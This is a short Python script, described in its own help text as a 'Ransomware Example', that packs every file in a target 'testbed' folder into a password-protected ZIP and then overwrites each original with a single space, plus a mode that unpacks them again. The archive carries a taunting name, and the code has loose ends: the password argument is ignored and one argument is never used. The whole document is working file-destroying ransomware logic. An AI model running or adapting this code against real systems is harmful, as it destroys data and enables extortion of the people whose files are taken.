import argparse
import os
import pyminizip
import shutil


def archive_and_encrypt(testbed_folder, zip_filename, password):
    zip_filename = testbed_folder + "/" + zip_filename
    try:
        # Create a ZIP file with a password
        filesToArchive = []
        # with ZipFile(zip_filename, 'w') as zip_file:
        for root, dirs, files in os.walk(testbed_folder):
            for file in files:
                if file != encrypt_holder_file:
                    filesToArchive.append(testbed_folder + "/" + file)

        pyminizip.compress_multiple(
            filesToArchive,
            [testbed_folder] * (len(filesToArchive)),
            encrypt_holder_file,
            "parola",
            9,
        )

        print(f"Archive created successfully: {zip_filename}")

        for root, dirs, files in os.walk(testbed_folder):
            for file in files:
                if file != encrypt_holder_file:
                    file = testbed_folder + "/" + file
                    with open(file, "w") as f:
                        f.write(" ")

    except Exception as e:
        print(f"Error: {e}")


def dearchive(testbed_folder):
    # shutil.rmtree(testbed_folder)
    pyminizip.uncompress(encrypt_holder_file, "parola", None, 0)
    os.remove(encrypt_holder_file)


encryption_key = "BeammersClubF*ckedYou"  # Replace this with your encryption key
encrypt_holder_file = "BeammersClubF*ckedYou.zip"


def main():
    parser = argparse.ArgumentParser(description="Ransomware Example")

    parser.add_argument(
        "--mode",
        choices=["encrypt", "decrypt"],
        required=True,
        help="Encryption or decryption mode",
    )
    parser.add_argument(
        "--testbed",
        required=True,
        nargs="?",
        help="Folder to be attacked and encrypted/decrypted",
    )
    parser.add_argument(
        "--buffer_file",
        required=True,
        nargs="?",
        help="File for storing ransomware metadata",
    )

    args = parser.parse_args()

    mode = args.mode
    testbed = args.testbed

    if mode == "encrypt":
        archive_and_encrypt(testbed, encrypt_holder_file, encryption_key)
    elif mode == "decrypt":
        dearchive(testbed)


if __name__ == "__main__":
    main()
